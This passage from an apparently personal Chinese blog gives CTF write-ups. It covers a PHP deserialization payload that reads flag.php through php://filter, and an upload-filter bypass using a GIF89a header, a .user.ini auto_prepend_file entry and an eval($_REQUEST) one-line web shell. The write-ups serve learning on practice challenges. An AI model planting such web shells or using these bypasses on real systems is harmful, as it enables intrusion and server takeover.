class="comment">//判断每一个字符的ASCII值</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体代码分析已经注释。<br>细看代码，细细分析之后其实并不难，主要是几个细节要注意。<br><code>1、is_valid()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;<span class="comment">//判断每一个字符的ASCII值</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>is_valid()： 要求我们传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。<br>绕过方法： 因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符。<br><code>2、强比较类型===</code></p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function __destruct() &#123;<span class="comment">//析构函数，这里是强比较，容易绕过</span></span><br><span class="line">      <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">          $<span class="keyword">this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;process();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这类型的比较连类型不同也比较，那我可以传入数字型的2实现绕过。<br>所以构造生成序列化payload函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<span class="comment">//利用文件包含</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="number">1</span>;<span class="comment">//随意</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>填入序列化payload</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">str</span>=O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>读取到flag<br><img src="https://pic.imgdb.cn/item/65786f5ec458853aefb31bd8.jpg"></p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>题目处看到存在源代码<br>我是经过上传测试后，发现双写，改后缀，传配置文件等都上传失败，而且想利用图片马的，但是没有存在文件包含漏洞，不知道有没有解析漏洞。<br>然后看源码的过滤规则吧。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="variable">$userdir</span> = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$userdir</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$userdir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$userdir</span> . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;upload&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$tmp_name</span>) &#123;<span class="comment">//应该是限制了文件大小</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$name</span>) &#123;<span class="comment">//文件不可以为空</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$name</span>, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph|htacess/i&quot;</span>, <span class="variable">$extension</span>)) &#123;<span class="comment">//黑名单正则过滤</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;<span class="comment">//对文件内容进行检测</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$tmp_name</span>);<span class="comment">//再次对文件的类型进行过滤</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$upload_file_path</span> = <span class="variable">$userdir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$name</span>;<span class="comment">//上传文件成功显示目录的文件</span></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="variable">$upload_file_path</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your dir &quot;</span> . <span class="variable">$userdir</span>. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$userdir</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相关代码作用见注释，主要是几个点要记录一下。<br><code>1、黑名单正则匹配后缀如何绕过</code></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ph|htacess/i&quot;</span>, <span class="variable">$extension</span>)) &#123;<span class="regexp">//</span>黑名单正则过滤</span><br><span class="line">        die(<span class="string">&quot;illegal suffix!&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>（1）、垃圾符号<br>就是加入很多符号，企图让其崩。<br>详情：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53079406/article/details/123525882">https://blog.csdn.net/qq_53079406/article/details/123525882</a><br>（2）、配置文件<br>apache的.htaccess<br>php通用的<code>.user.ini</code>。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaonuoqi/p/12337572.html">https://www.cnblogs.com/gaonuoqi/p/12337572.html</a><br><code>2、若检测文件的内容如何绕过检测</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;<span class="comment">//对文件内容进行检测</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>（1）、改用script脚本</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_REQUEST[<span class="number">1</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>3、exif_imagetype函数如何绕过</code></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$tmp_name</span>);<span class="regexp">//</span>再次对文件的类型进行过滤</span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable">$image_type</span>) &#123;</span><br><span class="line">       die(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这里介绍一下exif_imagetype()。</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># exif_imagetype — 判断一个图像的类型</span></span><br><span class="line"><span class="meta"># 语法</span></span><br><span class="line">exif_imagetype(<span class="built_in">string</span> $filename): <span class="built_in">int</span></span><br><span class="line">$filename 被检查的图像文件名。</span><br><span class="line"><span class="meta"># 返回值：如果发现了恰当的签名则返回一个对应的常量，否则返回 false</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># exif_imagetype() 读取一个图像的第一个字节并检查其签名。</span></span><br><span class="line"><span class="meta"># 本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 $_SERVER[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>] 结合使用来检查浏览器是否可以显示某个指定的图像。</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 预定义的常量</span></span><br><span class="line"><span class="number">1</span>	IMAGETYPE_GIF</span><br><span class="line"><span class="number">2</span>	IMAGETYPE_JPEG</span><br><span class="line"><span class="number">3</span>	IMAGETYPE_PNG</span><br><span class="line"><span class="number">4</span>	IMAGETYPE_SWF</span><br><span class="line"><span class="number">5</span>	IMAGETYPE_PSD</span><br><span class="line"><span class="number">6</span>	IMAGETYPE_BMP</span><br><span class="line"><span class="number">7</span>	IMAGETYPE_TIFF_II（Intel 字节顺序）</span><br><span class="line"><span class="number">8</span>	IMAGETYPE_TIFF_MM（Motorola 字节顺序）</span><br><span class="line"><span class="number">9</span>	IMAGETYPE_JPC</span><br><span class="line"><span class="number">10</span>	IMAGETYPE_JP2</span><br><span class="line"><span class="number">11</span>	IMAGETYPE_JPX</span><br><span class="line"><span class="number">12</span>	IMAGETYPE_JB2</span><br><span class="line"><span class="number">13</span>	IMAGETYPE_SWC</span><br><span class="line"><span class="number">14</span>	IMAGETYPE_IFF</span><br><span class="line"><span class="number">15</span>	IMAGETYPE_WBMP</span><br><span class="line"><span class="number">16</span>	IMAGETYPE_XBM</span><br></pre></td></tr></table></figure>
<p>（1）、魔术幻术头<br>在文件前添加GIF89a然后上传。<br><code>几个知识点以及注意点已经记录，那么这道题怎么破？</code><br>利用.use.ini<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33694172/article/details/87981584">https://blog.csdn.net/weixin_33694172/article/details/87981584</a><br><code>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。</code><br>所以，构造一个.user.ini，内容如下然后上传。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="attribute">auto_prepend_file</span>=123.png</span><br></pre></td></tr></table></figure>
<p><code>这句代码的意思是，指定123.png文件每次都包含在要执行的php文件前，前提是目录下有.php文件。上文中提到了目录下有index.php文件，那么满足条件，只要访问index.php，那么123.png文件的代码都会先执行</code><br>再构造一句话</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_REQUEST[<span class="number">8</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>找一张图片，合成图片马（无所谓）</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">copy</span> <span class="number">1</span>.png+<span class="number">1</span>.php <span class="number">123</span>.png</span><br></pre></td></tr></table></figure>
<p>将这些全部上传后，先尝试访问index.php观察一句话木马文件是否被包含。<br><img src="https://pic.imgdb.cn/item/657935d0c458853aef7e7595.jpg"><br>直接蚁剑连接找flag（当然也可以直接在url上输入命令）<br><img src="https://pic.imgdb.cn/item/657935e0c458853aef7ea62c.jpg"><br>参考:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaonuoqi/p/12337572.html">https://www.cnblogs.com/gaonuoqi/p/12337572.html</a></p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>这道题看我上面的[强网杯 2019] 随便注–SQL 注入 | 堆叠注入，几乎一样是堆叠注入的思路。</p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%9E%E6%88%98%E7%BB%83%E4%B9%A0%E5%BF%83%E5%BE%97/">实战练习心得</a></div><div class="post_share"><div class="social-share" data-image="/img/reHe.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/29/csoeDGUT/" title="200wCSOE|Recording"><img class="cover" src="/img/preview.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">200wCSOE|Recording</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/24/xxexml/" title="XXE|XML|利用检测绕过"><img class="cover" src="/img/preview.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XXE|XML|利用检测绕过</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/12/13/RaoGuoZJ/" title="Web安全（目前）绕过|姿势总结"><img class="cover" src="/img/reHe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-13</div><div class="title">Web安全（目前）绕过|姿势总结</div></div></a></div><div><a href="/2023/10/11/XssSelfPrac/" title="利用beef实现简单的XSS跨站攻击"><img class="cover" src="/img/reHe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-11</div><div class="title">利用beef实现简单的XSS跨站攻击</div></div></a></div><div><a href="/2023/10/12/XssSelfPrac2/" title="XSS-labs通关little心得"><img class="cover" src="/img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-12</div><div class="title">XSS-labs通关little心得</div></div></a></div><div><a href="/2023/12/01/billu/" title="billu"><img class="cover" src="/img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-01</div><div class="title">billu</div></div></a></div><div><a href="/2023/10/29/csoeDGUT/" title="200wCSOE|Recording"><img class="cover" src="/img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-29</div><div class="title">200wCSOE|Recording</div></div></a></div><div><a href="/2023/10/21/cmslogicLoudong/" title="业务逻辑|白盒环境下某cms渗透测试"><img class="cover" src="/img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-21</div><div class="title">业务逻辑|白盒环境下某cms渗透测试</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">DralinF</div><div class="author-info__description">A Little Blog Of Dralin</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">28</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fzsecurity-github"><i class="fab fa-github"></i><span>Come with me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2786245981@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=2786245981&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my little world</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-WarmUp%E2%80%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include%E2%80%93%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E5%8D%8F%E8%AE%AE%E7%8E%A9%E6%B3%95"><span class="toc-text">[ACTF2020 新生赛]Include–文件包含|协议玩法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec%E2%80%93%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">[ACTF2020 新生赛]Exec–命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping%E2%80%93%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">[GXYCTF2019]Ping Ping Ping–命令执行|代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E2%80%93SQL%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">[强网杯 2019]随便注–SQL注入|堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="toc-text">[极客大挑战 2019]Secret File</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">php伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="toc-text">[极客大挑战 2019]Http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife"><span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="toc-text">[极客大挑战 2019]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload"><span class="toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP"><span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="toc-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc"><span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="toc-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-text">[极客大挑战 2019]HardSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Calc-1"><span class="toc-text">[RoarCTF 2019]Easy Calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="toc-text">[MRCTF2020]你传你🐎呢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Ez-bypass"><span class="toc-text">[MRCTF2020]Ez_bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-text">[GXYCTF2019]BabySQli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="toc-text">[网鼎杯 2020 青龙组]AreUSerialz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Blacklist"><span class="toc-text">[GYCTF2020]Blacklist</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/12/14/wangluogfBig/" title="Lynn's Tasks"><img 